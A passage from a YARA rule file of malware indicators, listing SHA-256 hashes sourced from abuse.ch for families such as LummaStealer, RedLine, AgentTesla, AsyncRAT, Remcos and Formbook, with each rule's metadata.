ref_IOC = "IOC_LUMMASTEALER_LAB"
date_IOC = "2023-11-14 09:55:08"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "LUMMASTEALER"
file_type = "exe"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "eb2a0541c88a8d839a3506d67260951e8f6bcf4e46741658cb69c7178da93634" or
hash.sha256(0, filesize) == "56f2f2548297d7b72af40b7898d1dabe2dcb8090388985b218f4452d1a9c6ebf" or
hash.sha256(0, filesize) == "2d43530c81da22814e9debab6cc5dc8583d87b50c374e84c4ef153b0e51e4430" or
hash.sha256(0, filesize) == "c309b4f0f99e1686e9bc954da81701b3fd26cfccd17627cde55df929fb712311" or
hash.sha256(0, filesize) == "48e0956022211b6dde5b2f63169f3b1330bd010f61b19435faa54ad183709a48" or
hash.sha256(0, filesize) == "5911b3af7d48ce74fc6644064f176990a34230786598cfd97b90cf5208be7f5d" or
hash.sha256(0, filesize) == "371178f2c72748b41e33d1862f900e09d955f884f4b59857073c409e61b254ce" or
hash.sha256(0, filesize) == "4567eee3f0b37c6ce2e213d54820f1fcc2093f97743354bff6f98c57456c182f" or
hash.sha256(0, filesize) == "970dd198cf22fd0add061581be379fac2403bc071ebd495d32050e0c7ce5d75e" or
hash.sha256(0, filesize) == "4d201919a0ebca66c9444a66f9324fb870e4af25252f27aa405255cca0167379" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_NA_zip
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_NA_LAB"
date_IOC = "2023-11-14 04:21:40"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "NA"
file_type = "zip"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "929c3cadc1a37a6f11f9f2b473fa9518d3c4162480b90e517204842f1f809429" or
hash.sha256(0, filesize) == "c0aa81cd918caf90384d90ebafbe293b25968bb1a6063d74e2ee998f471bb635" or
hash.sha256(0, filesize) == "576f6ca3dae804a4f50f29d5e46731890f23998b77dd4bd0a5ef92ee58809bdb" or
hash.sha256(0, filesize) == "95d14e055fde0847733890ca247d22a1ef9ad581389e6beead1de46d3147ff90" or
hash.sha256(0, filesize) == "85899457d67ec7a33751203ce6af4f98699d6832f0cf0264db1163c21e70b8ba" or
hash.sha256(0, filesize) == "b312181bf94aea26d5f11a6bc046b8e8858328f1c8ac2b199100a08d5c0d4e87" or
hash.sha256(0, filesize) == "19b739c72921a6b24a4c9ae99f3371f2f25e4d6a7bab90c256a8c44e924f8e85" or
hash.sha256(0, filesize) == "a7382872a48a55f433257999b847b4ba8c26bfa1a565a819967a410033aa346d" or
hash.sha256(0, filesize) == "592f4ee0f178de6162247010bf85d4eaccfa123d8a26a9db120bea1e13a830cd" or
hash.sha256(0, filesize) == "65cf59b3533759dd226925d14d2923b4ff5e6077518af382552cc01c6d98bafe" or
hash.sha256(0, filesize) == "1847e53f0b2d743d51ee222f85372eb4dd452877635ed83f962d76c7293ebd74" or
hash.sha256(0, filesize) == "253c97514805ad5ee0dab272a842169a639faccdd38ce24bf08054b49e2c9fe9" or
hash.sha256(0, filesize) == "378a0fb9073a81918cdfc7a87508df39acfc751a9d646cab83cf7eee919081e0" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_REDLINESTEALER_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_REDLINESTEALER_LAB"
date_IOC = "2023-11-14 04:33:16"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "REDLINESTEALER"
file_type = "exe"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "ba87c237b03a3a5a54273ccded35d16559f33678a76f05ce856389e207b68046" or
hash.sha256(0, filesize) == "5f718ca24fcd480d7daad2d100dd55b7491c8704765b1fefc09884b3e1f31ebe" or
hash.sha256(0, filesize) == "154977c01029dd441484b65ac21a15ecd7f6144d48eccc5b2ecb67a56bf7cd90" or
hash.sha256(0, filesize) == "16a1c64a64c741f354cfa13e4640e2c10917a6968dc0ac075d0c3c13270a87cf" or
hash.sha256(0, filesize) == "195256a242e1a4f2a1833194d97951ebb74ac0091b0cd6be50a3e2f01691b421" or
hash.sha256(0, filesize) == "0bbc5d27d984dd680feb23e3aeae57f7139953d3efb11926b65952b5f664cf10" or
hash.sha256(0, filesize) == "26bb80ea94240a03b487cb1f62459d06a8ba4f9abc207cb5372a49609bfbabcf" or
hash.sha256(0, filesize) == "743754530bf3cdcf57d1f00030b109ffce1431d59d3bb0db3af2c45a57523928" or
hash.sha256(0, filesize) == "d2c19e15edee855176d5dbf18b19833779e009573573b419c0513e3cf82e6650" or
hash.sha256(0, filesize) == "6965c5ea91cea03b9a1204a762277a3ee3f4f89f02f2fea0599b6db6ea49e6f0" or
hash.sha256(0, filesize) == "23943b3d6938425abb71b4e82e9b8d3e93979091c175128c9f167dfc67118968" or
hash.sha256(0, filesize) == "f7c6af19e272f9017f27afa2699e68759a231edfcb1386f854121257d405e167" or
hash.sha256(0, filesize) == "90c9d40878861fb8a41fe65b46aab0a2a7153866619beb2efa2be92d71ffd240" or
hash.sha256(0, filesize) == "e3ba3128521529aa94345e7afbff46bee7a4c38eadce2e4f3a931afb22fad365" or
hash.sha256(0, filesize) == "7db04ddb55518c98493c17e533c6607d28a10d5385aa236d9a84a10670c49574" or
hash.sha256(0, filesize) == "cdd3fc19ff6129cd6a4ce32c48a2eceb0ed91e3f129e6f660bcfcebeac1296bc" or
hash.sha256(0, filesize) == "93851cdb575d5ef907a563962037853c8a59f77a8912db9ec637ef33a9d608b7" or
hash.sha256(0, filesize) == "fe3b975cd1b89dcd4ec203a5c74a6b612a2df2df4f200d40b5bd2efd9ab5d73f" or
hash.sha256(0, filesize) == "929e07936c124aca9a998c29cc6c75e91ec2f0f6a45acdc4b5d55ebcd453292c" or
hash.sha256(0, filesize) == "e69fa17979f4dc03a37fbe37f92d686092271a6d610ae3d31d59d52441dd812a" or
hash.sha256(0, filesize) == "d2df430d281ad78bc0690d63df9896fe195e2df53f2e9182c6f459094f70aa45" or
hash.sha256(0, filesize) == "c9c5798e7a3d4bd33f48a62c21591a50d890d25d509aa359798720ea4ba3fb14" or
hash.sha256(0, filesize) == "1114fd06909159c440fadc3bdb3ce6a5fc1c2ac3bcac48dc3a6b4402eb245fcf" or
hash.sha256(0, filesize) == "4f3d3b8e805a031fe8eeb47dca418fcbcade5d0190ecdee8930e942c9b4028ea" or
hash.sha256(0, filesize) == "0965997e1ccaef06f3bb54b93e0e7b3723bb9d99a0944f5550dc5c69cc9c42b8" or
hash.sha256(0, filesize) == "a3cc4fff4aac80dd379ae09712229eff389c1172d888180dbce61715965f4885" or
hash.sha256(0, filesize) == "dd49ae56ccd5824fe4f6b62ed6b3b3466a40e56163c23adee63b9b26d96b09c5" or
hash.sha256(0, filesize) == "fdad89fe9db1c6caa09660a2abd2a99e73a8f442dec417ff49b22614057c74ca" or
hash.sha256(0, filesize) == "6e627ca700a4794c9e46a849daed709312bacf1587109607e2f6c5eebb8a2598" or
hash.sha256(0, filesize) == "8e658be1287f69327c68a575863888918e1ca90e2bd09247170a81af6b3cd34b" or
hash.sha256(0, filesize) == "07df78604d9da2c127e1ab1b9dcf77cece0d2ba536746a7615c65d6689debeb8" or
hash.sha256(0, filesize) == "3e5d50f9256e94ff3a0e33bd30c01998a5cf299daf96808747729fb72650eab1" or
hash.sha256(0, filesize) == "2bccfd325ef0ae6b5522b4be977a4d25f81b42a2240c8a072773ef6ed6517900" or
hash.sha256(0, filesize) == "b4fc50feb3200e9f998dbb7b89dc252220c913c039624fb599aaaab413ede44e" or
hash.sha256(0, filesize) == "bbe4b4a0aab75cfdeb067064f73e05d793d699247ecd0ec93ef576cc115baca9" or
hash.sha256(0, filesize) == "19034212e12ba3c5087a21641121a70f9067a5621e5d03761e91aca63d20d993" or
hash.sha256(0, filesize) == "443fecbe6006903b09fa090230b790dd28249f5b17927c4989bc8c8eaad3ea3d" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_AGENTTESLA_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_AGENTTESLA_LAB"
date_IOC = "2023-11-14 03:19:49"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "AGENTTESLA"
file_type = "exe"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "f873fc0535d38b4ced119b8d2d555e23496174f01b5747b148c50925c2f60424" or
hash.sha256(0, filesize) == "cbebcef944dc8b96250fa57c98bef408a1f3f053f303871f89f8f3035b4b3e7a" or
hash.sha256(0, filesize) == "00e245b9a6266afb2eb6b81cf96520ca093b7242dd39b1b74daf4d5811ce35fe" or
hash.sha256(0, filesize) == "f112d1e7c8414255846131a14109ae12e45ad65296bd014601d0a83c9ea90cb2" or
hash.sha256(0, filesize) == "f6b96b0e4ca1b30e8f8973036205314b80f9ac4ebff7f0e46c1c74d51c72202a" or
hash.sha256(0, filesize) == "8c69f8ddbe47d5020425853ec7cc411a6656b7f411862d1de7f1081e1f6739c9" or
hash.sha256(0, filesize) == "dbe5ea4fdeec96fa6dbd4e378dd10f4c6b89a921adaff45fe358f3dbb55da1fb" or
hash.sha256(0, filesize) == "0f6154350e73fcd971f98f7bf3fd43773edd1cca24c16d259a4c755958970332" or
hash.sha256(0, filesize) == "6398b922ae61c54c8ccc93725d584c8e3f0c3005716cd21fd63fb79e3bc78836" or
hash.sha256(0, filesize) == "8632a6cdacd3c2ca44c427d1ef6bea4a9c16a7089a31f12fe79ba6e108860902" or
hash.sha256(0, filesize) == "df5e129f51b16e5dec57270b57c8c742242d83d3fe7c556184cb004ef353eea5" or
hash.sha256(0, filesize) == "b051fc9f064e736c6293b5f0d074f4fd3cbf145d0885b9a44539c8fbd4a15621" or
hash.sha256(0, filesize) == "64cf760478ae702e8157d46821cfdb8fad6ac6bf640b511ca736d7315db70632" or
hash.sha256(0, filesize) == "b1e5d0c3a97d2c9fd511f7991e33b2782f6dfc92ce9310e098e7fb53f6c4e3be" or
hash.sha256(0, filesize) == "4dc4ade4ae2d4abc759ac2fd298eeca6a88f1669fb1f3e761c46d134b5620a0f" or
hash.sha256(0, filesize) == "10f79a0bcff0aa1bd3c2ee942bb6894627ad897317413a354df70b50f4e0f56e" or
hash.sha256(0, filesize) == "dc7b17accaba0cbe8edc9a22bf625eb3e74f64b6e17046175095e4197792bd98" or
hash.sha256(0, filesize) == "5e32a7b5320ee9b3277092e547033be4d247629a4cfe396c19ed326bc2063210" or
hash.sha256(0, filesize) == "ca75c3b3a4278d054eac12a4c06addf6b48ab936ed5a21f1ba652d0d209c0f97" or
hash.sha256(0, filesize) == "c29c56a3681fb8d2f46ca4e7070f088e2e7c8f8b11c3d4218c79b91778c3536e" or
hash.sha256(0, filesize) == "8af6097b2ebe610f5f0602bfc6f5414f797cfbaef62ebf522f8c93e1f23eadf5" or
hash.sha256(0, filesize) == "259e6fc89c741d8f3a240402ffb767e833317bea4e190ba44e516adf63cd5b82" or
hash.sha256(0, filesize) == "69e82246e2a2444321ad9c8c84a445b8ec6b18702c2407565cae60e07b3823ef" or
hash.sha256(0, filesize) == "2d63c7065f4924e91461a07ccefafbddc4d7944cc5cbf0ad543a7c7f8103d36e" or
hash.sha256(0, filesize) == "9df6347fd6d4c18024e5330a6d05ab03d7f85f7aa70d7f083bf80f764852a367" or
hash.sha256(0, filesize) == "ee87b91b6480592bf45354a624ef6b478ed812f5ef33e36dbb6775fe057dbcfa" or
hash.sha256(0, filesize) == "22e6002a6d91fa1b1776f6b2e1cea01312a95ba504643bead0deaa0b90e193eb" or
hash.sha256(0, filesize) == "e3b762b0f49f604badd73ea22cd90861766a1568211b461ce08f687ff9d22f6f" or
hash.sha256(0, filesize) == "a999fa0b2c139c85ebb6a33cc1785777a333ee9b491ca696d776887f6d0400bc" or
hash.sha256(0, filesize) == "777c4e75052752ee1f5ccad536e28dc1bc5d8436892bbbcc86a7cf69d581ab8f" or
hash.sha256(0, filesize) == "8645bdb895457e08db9625bba8903490cecaad66c6cd3c0af3688afa60a425c1" or
hash.sha256(0, filesize) == "a245bbcd8bd89a1b4d24f79630212fed50905ac410132678fcea552048b66792" or
hash.sha256(0, filesize) == "a3e10f92baec9fd3a6ac12cfdc393f4031a94b4843300a767e89b0dfbc026a6d" or
hash.sha256(0, filesize) == "79b5b0596a21d1d0642a64198c45d8662e9eede03347ce5f50eaac73f31c32e7" or
hash.sha256(0, filesize) == "b74c35fff28c2545faae06261ed6ee1649067638169ef24dfa449bb201fd6039" or
hash.sha256(0, filesize) == "7a26f105efac6daa9226f4ab1b6bf0ff600fe2140da9fcf3e91e502ed359ee5f" or
hash.sha256(0, filesize) == "da21ece2f4aa50ee504970a2fefed88038ade14bb3f68b0d6e388da6f40628c9" or
hash.sha256(0, filesize) == "fa86b4d3e3e4217d2c502925eb6c41fb7a9bf0a17a976fc6a11a849d5861c8d0" or
hash.sha256(0, filesize) == "aa7afebfd032006687eddefc5578bbc1933f1477aeaef5a17427677a4de08d95" or
hash.sha256(0, filesize) == "db5791df9f9164152525e6564a5984cc23ff98593c92d0ad167b8d7fbb0e3111" or
hash.sha256(0, filesize) == "047575bd81b3dc7b788d1f33b92ccd8e42804e7bb9b578246a1284d0e565a6b9" or
hash.sha256(0, filesize) == "421bff513232de6adf60e78f45df28ed50b3897a27570596e12f661d2bb4e8d9" or
hash.sha256(0, filesize) == "50174c869349bc2bbb082345c016fb75442f9858a91208180f5ca49ada8e9c5d" or
hash.sha256(0, filesize) == "f1a6e53beb7e03091a732ba8d1093eb5162dd620c85f7ee44bdc6efe25c3c853" or
hash.sha256(0, filesize) == "e250eef1eaea9092ecaa3ecd7a94b02720a9fb2aadd9c8a3b234e52ed7710ae8" or
hash.sha256(0, filesize) == "2772267437ac2a4a39e1c4893788b420e3eafd75c0517c3d8bb58516c8e2b196" or
hash.sha256(0, filesize) == "f29177a4cfd69578f868616ce53b974ee5c362b2d43e70a17277ac18bbe4d125" or
hash.sha256(0, filesize) == "76b695c17786615cfe769077dde4f7d7dae83e8a6f638680c9e0e59b8d1f582c" or
hash.sha256(0, filesize) == "91b0829c56341b5ebe30e0b59b263f8d174bcf4b1718bbfe5cb18b7faa2d606f" or
hash.sha256(0, filesize) == "c073d55e30e424b99d07e376c38ca35b579dbd327da6be96cec527b0e3132ccd" or
hash.sha256(0, filesize) == "cb15630de2fc38b0f07691ab16cfebcc1a6a940c867c0fc41a811c26525d9fc4" or
hash.sha256(0, filesize) == "d8c86642c4e7e86d3591143c9bd7a7ca0278ed8812908b81e5633948ebee2eee" or
hash.sha256(0, filesize) == "780864eca14f5609a0466e0831fd4ea929247f1bc6768ef0aabbb4a12135b319" or
hash.sha256(0, filesize) == "7c694dd1d56f0082c40c850df23deb92f994cabc5af5a391f52e7e1702b50def" or
hash.sha256(0, filesize) == "c804d3785acf26364471c13ee7b8714bce6329666877dff5541252ae0613af55" or
hash.sha256(0, filesize) == "9b1a04a9a7488c5c618d00ee10920203d5bb51cc2c3470aae460f7a971a44843" or
hash.sha256(0, filesize) == "8992f05844656419027980e08a09950c5162846b52277dc662b4866dcfa18871" or
hash.sha256(0, filesize) == "e0a14b9acddbf73d270c2eabf671ce58e1c2aaa237ccf2de320efedc947b6ccc" or
hash.sha256(0, filesize) == "899c4c78e96a4c19a650d2cad2ad6b7e358bc78f42c9ba9407821e0be43347f6" or
hash.sha256(0, filesize) == "c49d3c572cd0b818ced382d46198cd833015f79459b10e2cb4caee1bd18f5e72" or
hash.sha256(0, filesize) == "1e6327a5456f3aac77ec28cc80c9f9f8cff8a157a25a8a2f597764dcbccce3ea" or
hash.sha256(0, filesize) == "e90446f4637905f90836fe5c684ac38531090b2f64bb561a555e09cb4af076fc" or
hash.sha256(0, filesize) == "e5a39d95388a1324e37c31b9bc6a527941dd0c0736a0971ead7ec611474d2eb7" or
hash.sha256(0, filesize) == "1e1a3828028401c6052fd951935347159121c19c01e7dc47fa2d4620a60c720d" or
hash.sha256(0, filesize) == "6c3aa6c7804d75cd98888500430589c9996bd681881fdac1850590343ab4d13d" or
hash.sha256(0, filesize) == "4ae304d194dbeac326186c31c58bbf4f4c87791ddbb048efc34854e75dde91bc" or
hash.sha256(0, filesize) == "7a04dd7893f89eeffa0df553493f9a5367bf08e041c4989888e84d7006a65a65" or
hash.sha256(0, filesize) == "57454ca5dffc314f665767b53dde6778afe2ef9b3470eadc71ada2130854ab2d" or
hash.sha256(0, filesize) == "73a225250c2ccdff194478cd7d7aa96a04b314c6fbdf105183198548a0f93684" or
hash.sha256(0, filesize) == "aebcd6039f3bfcf9ddfadaee2d5e631afb676e36e1497036283b24c73b810800" or
hash.sha256(0, filesize) == "f45cce1292aa30dc88decc03fe81e7c10a64e4302eb1e3faa81c385e36d2a1ff" or
hash.sha256(0, filesize) == "3f0f2b7e3062679b5ba9559637eee1d3ab15dea790fbf3c85b69fcccb3edc8bf" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_NA_unknown
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_NA_LAB"
date_IOC = "2023-11-15 14:20:43"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "NA"
file_type = "unknown"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "2a8f9fa9e3d05c509f9858cae27a530a1cd6284c9bd4b77e12c811c28b9dadb7" or
hash.sha256(0, filesize) == "b6702aff8b11508caf4a291f7580eeda872dd8d8d46b31bd342828fa23124e46" or
hash.sha256(0, filesize) == "70aa5561a87f3d07e2ade10726204db619f4370632d44bd9ff2b6619e4755803" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_NA_msi
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_NA_LAB"
date_IOC = "2023-11-14 06:30:05"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "NA"
file_type = "msi"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "d82ea0bf95437276d3c5bc8f78b6f3ca21e028ec69e3c0ec15bdca37badcbef6" or
hash.sha256(0, filesize) == "a8338b8fece4e078c2ec6b634d6d1a161beb68cc8632e41127edb24e2b9ec80c" or
hash.sha256(0, filesize) == "70ae0ba7881ccde62370f1168b00662af52a354b97f6cf8b01219f9046c0270f" or
hash.sha256(0, filesize) == "ab6b3a30d643bd1a807d4415e554a7e005c9320d1adbd0bfb4666cf1509c3078" or
hash.sha256(0, filesize) == "69925c370a71b0bc37eb5d6381e8fc3309a7e71a7bdade54233214c73c728170" or
hash.sha256(0, filesize) == "24e7e2dcb6102224d489081a32b1aee6c1ea035295d58fbce7f85c7f22c543fe" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_AMADEY_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_AMADEY_LAB"
date_IOC = "2023-11-14 09:23:43"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "AMADEY"
file_type = "exe"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "a4528e6b733c6b595e93e3d50fb849edbe9fcd062b65fb2bd4ae5d8d76ac5b76" or
hash.sha256(0, filesize) == "755cbdd175e237a66a78ed70d9d8a39c8946a57e64c199be154b86f528671d51" or
hash.sha256(0, filesize) == "92b44334a248b6b3850c38fc3aadb63d0ae1828cc2a6617be41299eb4707d82e" or
hash.sha256(0, filesize) == "75b6b00dcdb1025df8a76e02a7c989b5c6d670e0dcf1737be4f20641b89cde77" or
hash.sha256(0, filesize) == "83ef6d2414a5c0c9cb6cfe502cb40cdda5c425ee7408a4075e32891f4599d938" or
hash.sha256(0, filesize) == "6d3cd39358c91c56b4798b64c73f03e3877a80dffe01d07e2ad13e979e845ed0" or
hash.sha256(0, filesize) == "75521cc92675383e1f9b8996fd925345e562da8b2a2aedb9cebacb9cc0ee0a80" or
hash.sha256(0, filesize) == "d3a40144912dfa3f095ab0526aba7c0ce4950793090a632dc76f9fd93be815ab" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_ASYNCRAT_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_ASYNCRAT_LAB"
date_IOC = "2023-11-14 09:19:43"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "ASYNCRAT"
file_type = "exe"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "a9b516990db5fb757d5745cbca218fb6996562af0454dc3820403890d77abcb6" or
hash.sha256(0, filesize) == "ebb3a5afeb6a34fd0ca7e4ee234a04f66de5b7a38fbc4171ff5e8bcaeec8e100" or
hash.sha256(0, filesize) == "2a318235a7908da2cfacd1711becc3c0da7a23359a98628f6d1fe14a7dd97b70" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_NA_dll
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_NA_LAB"
date_IOC = "2023-11-14 04:42:31"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "NA"
file_type = "dll"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "3afd0ec9ff87802fecb70c64bf0c0b86081bd909b9b649f902931964d585632a" or
hash.sha256(0, filesize) == "d6f843c7ea0e1bbef9b381b35d2e942b88f204c1a43de76011da57563f21c95e" or
hash.sha256(0, filesize) == "379e01a20f66afe32b7792eab0bc3d97179ee0fcca919e4604769d6a6fc3c2e1" or
hash.sha256(0, filesize) == "506bc39774eea82a02c20bce1ef02b751133eee9e512747c250d972124fef76b" or
hash.sha256(0, filesize) == "ea44b39b32fd766f5a4c9b0d426451065e3ed6d9d977cddcb7cfacfcd82be47d" or
hash.sha256(0, filesize) == "5cc6b31669023b1f74191cc76d25924fb652a19c92eb3bef80d176304b0cee1a" or
hash.sha256(0, filesize) == "035243c99d29f9f785e7f76ac3e744c56c7386449ad51b1d7cce9c19380a487c" or
hash.sha256(0, filesize) == "ba3b6093e676d0d4ed3832efc496ad3a1b7c24e9a27574520c7b54e84b93de32" or
hash.sha256(0, filesize) == "cd12655ebbcfc6789326d27f125ee39ec47b49c93ffd3e80af11d308a917107d" or
hash.sha256(0, filesize) == "1f0dd88879a0facb7ad1cec668a9c65bcf06ac1d69945989770f04740e1117a7" or
hash.sha256(0, filesize) == "fd45836d17756388b7bf67083e5247fdbe2154149f4a9cf3d30fc8348e3020ac" or
hash.sha256(0, filesize) == "e4f32b898bb95e747f9b11d1b7dd52a8a36e7116e66fa171eebed1bb290eabe5" or
hash.sha256(0, filesize) == "af32907430cff27948a020b20e76c590d6561e1a9f7464d7071fc4d5c4db7b1d" or
hash.sha256(0, filesize) == "080c2b0ebcaa675f7cc3087a62b458bd05829a5056b93b478b0c137140e613ed" or
hash.sha256(0, filesize) == "c367c645711aeebb01f2332638dbad2b665bb9cc7e34fcc6c2eae91385da730d" or
hash.sha256(0, filesize) == "98cd89574c41cd0f664b482c7964386b96987b8dac316860f4f02b351da8a77e" or
hash.sha256(0, filesize) == "fd84fbbb02015979484e56ee1f8de94df66b7c031c8df094c25ee8d4189e2f62" or
hash.sha256(0, filesize) == "5dce23221c5c4ce62fb33f2de5438ae15b86d796c39091cfb495ca01f8eb04c2" or
hash.sha256(0, filesize) == "2eef4b05700162c4b8b9f00d8ef7b0d11e1e273219d30130561293bb429f1850" or
hash.sha256(0, filesize) == "f4b90e1ceaa1c88458604f34205b55f5cc7bbd11dc9da6e5fb0b2dd20215774a" or
hash.sha256(0, filesize) == "8383d1cf45e6dd5345dc5d6e7aff4dff75a5dac629a617cc08150924ab019fee" or
hash.sha256(0, filesize) == "7b9c99c1aeb0681b96a38c5084658497d4ebd6a196f8618030cb034295d825b3" or
hash.sha256(0, filesize) == "1f9a4fa0a9cb98637bf34cf919c0f964551b79abcce5621d7b165720aa45988c" or
hash.sha256(0, filesize) == "f122b4ab576902c76b6f127399d6fa51c94fcc90a87c4f870acb6aa2c74fc2be" or
hash.sha256(0, filesize) == "7dfc837c2da8c5a32150052a9876447170d8923b31409a3a1919d918027cae19" or
hash.sha256(0, filesize) == "591d2575c173f07028f37e371da17f7727c78d31ab1578b222c976fa5fad2b3c" or
hash.sha256(0, filesize) == "bc60d6b0dd2558c683f2db24c79187f1c870e35deb4dd5586965f49e2d24de33" or
hash.sha256(0, filesize) == "f366d535c63702f7412cfe4ec1c63edc3dd86c44f2d42ce9e6cfd63cec78d930" or
hash.sha256(0, filesize) == "b9a953af462e7c92a64aa70d6e596cd715b3e0cf5761bd76a80d8c252c45a38c" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_RACCOONSTEALER_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_RACCOONSTEALER_LAB"
date_IOC = "2023-11-14 04:33:07"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "RACCOONSTEALER"
file_type = "exe"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "bdcb0564911bdb1f151d4f58f82bce75a8c861ee251ea7273487a34fec865654" or
hash.sha256(0, filesize) == "d74b9b445cc4cb4fef7ce48910ef2f930bb044dc09221df368ff3353aff70841" or
hash.sha256(0, filesize) == "f6be22baa5e6bc398c0130a7d93411166fd2441722cdd6a3ec3f7205a384acfe" or
hash.sha256(0, filesize) == "79ead2d23149eaa2413377b314d1e4351cbe2451839cd652ed51c5c2e9a006dc" or
hash.sha256(0, filesize) == "8e6021918d108cbb2e19ab300a03e25b1e1e0c6e621754f5940e6db2ac195d0a" or
hash.sha256(0, filesize) == "f14734d04f355fa903c6482fc4f3662c3ac1ab892ad14f2f135ae357d1f04db4" or
hash.sha256(0, filesize) == "c6d0d98dd43822fe12a1d785df4e391db3c92846b0473b54762fbb929de6f5cb" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_REMCOSRAT_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_REMCOSRAT_LAB"
date_IOC = "2023-11-14 10:11:09"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "REMCOSRAT"
file_type = "exe"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "e6324e216c641b6d10f7acbd518cc6d859a842c80e5c58e852e64b6e8a0b7666" or
hash.sha256(0, filesize) == "39c906f25a69d675d9636c3dcfd78c18cae6a9b7a49697c23a08d54004b4c6ee" or
hash.sha256(0, filesize) == "3f631c04c084cad9373730dad3b838b4c4f4d079e825ccffdab3b09d12b027c2" or
hash.sha256(0, filesize) == "82801d63eca2fdd570d211cdffe08f8aeb3ead46d51dec316ca36f389fe29d8b" or
hash.sha256(0, filesize) == "2abba169b2f3be758c20b3d23dd9fac351a2c6aed1caa97e32ccbbb888e83c80" or
hash.sha256(0, filesize) == "40870b8167513757fd7d369a7db8f32b828a0ba1540d88324ff19867f9045494" or
hash.sha256(0, filesize) == "67c980215d2b7daa075a60a95527409258475ab2e6e71a1fa59a18dff0cb0c19" or
hash.sha256(0, filesize) == "ef9982ce0b9a6a27c0fccc7017093b567663e1ab30bee707bb4316dbfa5e6793" or
hash.sha256(0, filesize) == "6b17811bf0955ae82d108f30f526b741e15e6f00024cc71b34cc315cd64297b0" or
hash.sha256(0, filesize) == "d1fc6f72efcb3534ded2e3b870fa01ab945babf2b30d3505573f9f6bb81979eb" or
hash.sha256(0, filesize) == "f7ea87d7e1c7167b0ee3091546b6740386996794f72ea603c10c4643609b0747" or
hash.sha256(0, filesize) == "76143c27dd7b0f5017b03d53fffaf18ded8b2c4b310ca61f89b2a6ca78786b7e" or
hash.sha256(0, filesize) == "7fc8d7dc73ea28fb88262e807b2707ff6bdf2ba3b84ca2b4d866dc5e9e2def8e" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_FORMBOOK_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_FORMBOOK_LAB"
date_IOC = "2023-11-14 05:40:06"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "FORMBOOK"
file_type = "exe"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "10f863afc82cd61fdc8a55bc67e2726401ac51c4e9647ddd19dbf1ea30df9e09" or
hash.sha256(0, filesize) == "c88aa06f7f7d22f3a6c66c84bf6aafd8838357d02d2287bbbcd61fb21264dfe4" or
hash.sha256(0, filesize) == "0838dcd24cf228707272c365f4a9552e4d3b69b43716cea36fd95f250f62a7ab" or
hash.sha256(0, filesize) == "6282a84266a87aa1e62b1304913bfdc8ce4c122f59f5731503f78655beaaa27e" or
hash.sha256(0, filesize) == "d2799bffc4e285fb9472cdf9e68b4637288c44cd7ed7d5ff7680228c63d525b7" or
